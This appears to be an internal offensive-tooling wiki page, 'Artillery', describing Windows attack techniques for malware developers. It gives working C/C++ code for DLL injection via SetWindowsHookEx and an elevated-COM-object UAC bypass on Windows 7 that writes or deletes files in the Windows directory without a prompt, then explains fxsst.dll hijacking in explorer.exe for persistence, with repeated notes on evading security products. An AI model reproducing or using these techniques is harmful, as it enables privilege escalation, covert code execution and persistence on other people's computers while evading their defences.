# Artillery

DLL Injection using SetWindowsHookEx
Overview
This code sets a windows hook with the DLL to be injected and a dummy function that simply passes the hooked message to the next handler. After setting the hook, a thread message is sent to force the DLL to be loaded to handle it.

hDll = LoadLibraryEx(L"ElevatedComTestDLL.dll",NULL, DONT_RESOLVE_DLL_REFERENCES);
hookProcAddr=(HOOKPROC)GetProcAddress(hDll, "_CBTProc@12");
injectHook=SetWindowsHookEx(WH_GETMESSAGE,hookProcAddr, hDll, tid);
if(!PostThreadMessageW(tid,WM_RBUTTONDOWN, (WPARAM) 0, (LPARAM)0))
    return false;
This is a well-known technique and may trigger PSP warnings.

Artillery Utilizes elevated COM object to write to System32 and an auto-elevated process to execute as administrator	

Elevated COM Object UAC Bypass (WIN 7)
Overview
Windows 7 includes a feature that enables approved applications running with Admin privileges to perform system operations without the UAC prompt. One method an application can use to do this is to create an “Elevated COM Object” and use it to perform the operation. For example, a DLLloaded into explorer.exe can create an elevated IFileOperation object and use it to delete a file from the Windows directory. This technique can be combined with process injection to produce a more direct UAC bypass.

The code sample below must be executed within the context of a process approved for elevation, otherwise it will trigger the UAC prompt. Most Microsoft-signed executables that ship with Windows are approved, most usefully explorer.exe, as it is generally running, but also others such as calc.exe or notepad.exe may be useful if executing in explorer’s process is alerting to a PSP.

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void **ppv)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[50];
	WCHAR wszMon[300];
 
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon)/sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMon, &bo, riid, ppv);
}
 
void ElevatedDelete()
{
	MessageBox(NULL, "DELETING", "TESTING", MB_OK);
 
	// This is only availabe on Vista and higher
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	IFileOperation *pfo;
	hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
	pfo->SetOperationFlags(FOF_NO_UI);
	IShellItem *item = NULL;
	hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\TEST.DLL", NULL, IID_PPV_ARGS(&item));
	pfo->DeleteItem(item, NULL);
	pfo->PerformOperations();
	item->Release();
	pfo->Release();
	CoUninitialize();
}
A standalone sample implementation of this technique is available in the UACBypass project. It can be found in the Malware Component Library, currently located in Umbrage SVN (To be moved to Stash soon™...)

The sample copies a DLL file into the C:\Windows\ directory without prompting UAC. This can be combined with WinFax DLL Hijacking to achieve code execution after reboot

Windows FAX DLL Injection
This is a simple DLL hijacking attack that we have successfully tested against Windows XP,Vista and 7. A DLL named fxsst.dll normally resides in \Windows\System32 and is loaded by explorer.exe. Placing a new DLL with this name in \Windows results in this being loaded into explorer instead of the original DLL. On Windows Vista and above, the DLL‘s reference count must be increased by calling LoadLibrary on itself to avoid being unloaded.

This achieves persistence, stealth, and (in some cases) PSP avoidance.


Issues
On Windows Vista and Windows 7 the \Windows directory is protected by UAC. This requires system privileges to install and/or delete the DLL without triggering a UAC prompt.
